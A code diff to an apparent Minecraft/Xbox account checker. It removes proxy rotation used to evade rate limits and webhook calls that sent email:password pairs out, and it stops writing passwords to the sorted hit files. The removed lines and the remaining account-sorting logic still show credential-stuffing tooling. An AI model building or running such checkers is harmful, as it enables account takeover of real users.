@@ -1,9 +1,12 @@
 """
 minecraft_checker.py — Minecraft entitlement detection and account type classification.
-Uses /entitlements/license endpoint with checkownership() logic from DonutSMP Checker.py.
 """
 import time
 import requests
+
+
+def _account_label(email: str) -> str:
+    return email
 
 
 def checkownership(entitlements_response: dict) -> str | None:
@@ -56,15 +59,11 @@ def checkmc(
     token: str,
     xbox_token: str,
     config: dict,
-    proxylist: list,
     maxretries: int,
-    getproxy,
     stats_lock,
     fname: str,
     write_dedupe,
     capture_obj,
-    send_xbox_webhook=None,
-    send_other_webhook=None,
     engine=None,
 ) -> bool:
     """
@@ -87,12 +86,10 @@ def checkmc(
             if checkrq.status_code == 429:
                 if engine:
                     engine._report_rate_limit()
-                session.proxies = getproxy()
                 time.sleep(2 + attempts)
                 continue
             break
         except Exception:
-            session.proxies = getproxy()
             time.sleep(1 + attempts * 0.5)
             continue
 
@@ -132,29 +129,14 @@ def checkmc(
     is_other = acctype.startswith('Other:')
 
     if is_xgpu:
-        write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
-        if send_xbox_webhook:
-            try:
-                send_xbox_webhook(email, password, acctype, config)
-            except Exception:
-                pass
+        write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{_account_label(email)}\n')
     if is_xgp:
-        write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
-        if send_xbox_webhook:
-            try:
-                send_xbox_webhook(email, password, acctype, config)
-            except Exception:
-                pass
+        write_dedupe(fname, 'XboxGamePass.txt', f'{_account_label(email)}\n')
     if is_normal:
-        write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
+        write_dedupe(fname, 'Normal.txt', f'{_account_label(email)}\n')
     if is_other:
         items_str = acctype.replace('Other: ', '')
-        write_dedupe(fname, 'Other.txt', f'{email}:{password} | {items_str}\n')
-        if send_other_webhook:
-            try:
-                send_other_webhook(email, password, items_str, config)
-            except Exception:
-                pass
+        write_dedupe(fname, 'Other.txt', f'{_account_label(email)} | {items_str}\n')
         return True  # Other accounts don't get full capture processing
 
     return True
